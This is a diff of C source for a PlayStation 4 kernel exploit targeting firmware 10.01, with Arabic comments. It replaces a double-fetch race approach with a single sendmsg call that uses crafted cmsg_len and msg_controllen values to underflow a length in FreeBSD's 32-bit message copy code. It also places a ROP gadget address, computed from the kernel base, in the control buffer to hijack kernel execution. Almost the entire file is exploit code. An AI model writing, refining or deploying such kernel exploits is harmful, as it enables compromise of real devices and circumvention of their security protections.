@@ -1,12 +1,16 @@
 #include <ps4.h>
+#include <stdint.h>
+#include <string.h>
 
-// الإزاحات (Offsets) لنسخة 10.01 - استبدلها بما يناسب بحثك
+// --- الإزاحات (Offsets) لنسخة 10.01 ---
+// اخترنا هذا الـ Gadget لأنه يسهل رصد التغير في السجلات
 #define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
 
-// تعريف الهياكل الخاصة بـ 32-بت كما تظهر في ملف freebsd32_misc.c
-struct iovec32 {
-    uint32_t iov_base;
-    uint32_t iov_len;
+// تعريف الهياكل المتوافقة مع 32-بت كما في الملف المصدر
+struct cmsghdr32 {
+    uint32_t cmsg_len;   // الطول
+    int      cmsg_level; // البروتوكول
+    int      cmsg_type;  // النوع
 };
 
 struct msghdr32 {
@@ -19,81 +23,57 @@ struct msghdr32 {
     int      msg_flags;
 };
 
-struct cmsghdr32 {
-    uint32_t cmsg_len;
-    int      cmsg_level;
-    int      cmsg_type;
-};
-
-// ماكرو التراصف الخاص بـ FreeBSD 32-bit
-#define FREEBSD32_ALIGNBYTES (4 - 1)
-#define FREEBSD32_ALIGN(p) (((uint32_t)(p) + FREEBSD32_ALIGNBYTES) & ~FREEBSD32_ALIGNBYTES)
-
-#define CONTROL_LEN 64 // حجم الـ Buffer الفعلي في ذاكرة المستخدم
+#define CONTROL_LEN 256
 uint8_t control_buf[CONTROL_LEN];
-struct cmsghdr32 *cmsg;
-int global_sock;
-
-// دالة إرسال الرسائل (تستهدف استغلال الثغرة)
-void *sendmsg_thread(void *arg) {
-    struct msghdr32 msg = {0};
-    
-    msg.msg_control = (uintptr_t)control_buf;
-    // نخدع النواة بأن طول المساحة 10 بايت فقط
-    // هذا سيجعل ALIGN(9) = 12 تتجاوز الحدود
-    msg.msg_controllen = 10; 
-
-    while(1) {
-        // Syscall 28 هو sendmsg في FreeBSD
-        syscall(28, global_sock, &msg, 0);
-    }
-    return NULL;
-}
-
-// دالة السباق (Race) لتغيير الطول فجأة
-void *race_thread(void *arg) {
-    while(1) {
-        // نضع قيمة تجعل الـ ALIGN يقفز خارج الحدود
-        cmsg->cmsg_len = 9;   
-        
-        // تبديل سريع لقيمة صغيرة لتعطيل الفحص المبدئي (Double Fetch)
-        cmsg->cmsg_len = 4; 
-    }
-    return NULL;
-}
 
 int _main(struct thread *td) {
+    // 1. تهيئة المكتبات الأساسية
     initKernel();
     initLibc();
 
     uint64_t kbase = get_kernel_base();
     uint64_t trigger_gadget = kbase + OFF_PUSH_RSP_POP_RSI_RET;
 
-    // إنشاء Socket (مثلاً AF_INET أو AF_INET6)
-    global_sock = syscall(97, 2, 2, 0); // socket(AF_INET, SOCK_DGRAM, 0)
-    
+    // 2. إعداد الـ Socket
+    // استخدام AF_INET و SOCK_DGRAM (UDP) لتفعيل مسار معالجة الرسائل
+    int sock = syscall(97, 2, 2, 0); 
+    if (sock < 0) return -1;
+
+    // 3. تجهيز الـ Buffer الملغوم
     memset(control_buf, 0, CONTROL_LEN);
+
+    // إعداد أول هيكل رسالة
+    struct cmsghdr32 *cmsg = (struct cmsghdr32 *)control_buf;
     
-    // إعداد أول رسالة تحكم في الـ Buffer
-    cmsg = (struct cmsghdr32 *)control_buf;
-    cmsg->cmsg_level = 0;   // IPPROTO_IP
-    cmsg->cmsg_type = 7;    // IP_RETOPTS (أو أي نوع يعالج خيارات)
-    cmsg->cmsg_len = 4;
+    /* الخدعة الحسابية:
+       نضع cmsg_len = 9. 
+       في النواة: sizeof(struct cmsghdr32) غالباً ما يكون 12 بايت.
+       الدالة ستجعل copylen = 9 بايت.
+       ثم تنفذ: ctlbuf += ALIGN(9) أي ctlbuf += 12.
+       وتنفذ: len -= ALIGN(9) أي 11 - 12 = -1 (Underflow).
+    */
+    cmsg->cmsg_len = 9; 
+    cmsg->cmsg_level = 0; // IPPROTO_IP
+    cmsg->cmsg_type = 7;  // IP_RETOPTS
 
-    // ملء منطقة الـ Out-of-bounds بـ ROP Gadgets
-    // إذا نجح الـ Bug، النواة ستقرأ "الرسالة التالية" من هنا
-    for (int i = 12; i < CONTROL_LEN - 8; i += 8) {
-        *(uint64_t *)(control_buf + i) = trigger_gadget;
-    }
+    // 4. وضع الـ ROP Chain عند نقطة "الرسالة الوهمية الثانية"
+    // بما أن التراصف الخاطئ سيقفز بنا إلى الإزاحة 12، نضع عنواننا هناك
+    *(uint64_t *)(control_buf + 12) = trigger_gadget;
 
-    ScePthread t1, t2;
-    // تشغيل الخيوط لبدء السباق
-    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
-    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");
+    // 5. إعداد ترويسة الرسالة (The Master Trigger)
+    struct msghdr32 msg = {0};
+    msg.msg_control = (uintptr_t)control_buf;
+    
+    // نحدد الطول الكلي بـ 11 كما اقترحت لكسر عملية الطرح في النواة
+    msg.msg_controllen = 11; 
 
-    // الانتظار (في الاختبار الحقيقي قد يحدث Panic قبل الانتهاء)
-    scePthreadJoin(t1, NULL);
-    scePthreadJoin(t2, NULL);
+    // 6. طلقة واحدة للتنفيذ (بدون Race)
+    // نحن نستخدم syscall(27) لـ recvmsg أو syscall(28) لـ sendmsg
+    // في حالة freebsd32_copy_msg_out، يتم استدعاؤها غالباً عند استقبال رسائل
+    syscall(28, sock, &msg, 0);
+
+    // تنظيف
+    syscall(6, sock);
 
     return 0;
 }
